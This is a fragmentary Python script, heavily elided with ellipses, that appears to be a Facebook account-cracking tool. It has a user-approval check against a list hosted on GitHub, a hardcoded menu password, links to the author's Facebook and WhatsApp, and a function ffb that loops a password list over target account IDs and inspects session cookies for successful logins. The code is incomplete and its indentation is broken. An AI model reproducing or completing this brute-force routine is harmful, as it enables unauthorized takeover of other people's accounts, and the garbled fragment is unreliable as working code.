...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/YUBIN-XD/approval/blob/main/approval.txt").text
    if id in httpCaht:
      ...
      os.system('xdg-open https://www.facebook.com/profile.php?id=100053895229725')
      time.sleep(1)
      exit()
  except: 
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public_mai()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100053895229725');menu()
                        ...
                        url_wa = "https://api.whatsapp.com/send?phone=9840526986&text="

                        name = input(" [•] Name Lekh Jhato: ")
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        YUBIN=session.cookies.get_dict().keys()
